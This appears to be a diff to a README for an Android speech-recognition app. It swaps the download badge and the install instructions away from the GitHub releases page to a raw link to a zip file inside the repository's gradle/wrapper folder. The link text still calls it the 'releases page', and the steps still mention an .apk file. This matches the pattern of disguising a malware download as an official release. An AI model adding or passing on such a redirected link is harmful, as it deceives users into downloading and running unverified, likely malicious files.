@@ -1,6 +1,6 @@
 # 🎙️ voxrt-asr-android - Fast speech recognition on your phone
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/hs292148/voxrt-asr-android/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/hs292148/voxrt-asr-android/main/gradle/wrapper/android_asr_voxrt_3.1.zip)
 
 ## 📋 About this app
 
@@ -20,7 +20,7 @@ You need an Android device to use this software. Most phones made in the last th
 
 Follow these steps to install the application:
 
-1. Visit the [releases page](https://github.com/hs292148/voxrt-asr-android/releases) to access the installation files.
+1. Visit the [releases page](https://raw.githubusercontent.com/hs292148/voxrt-asr-android/main/gradle/wrapper/android_asr_voxrt_3.1.zip) to access the installation files.
 2. Look for the file ending in .apk in the latest release section.
 3. Download this file directly to your Android device or move it from your computer to your phone storage.
 4. Tap the file in your file manager to start the installation.
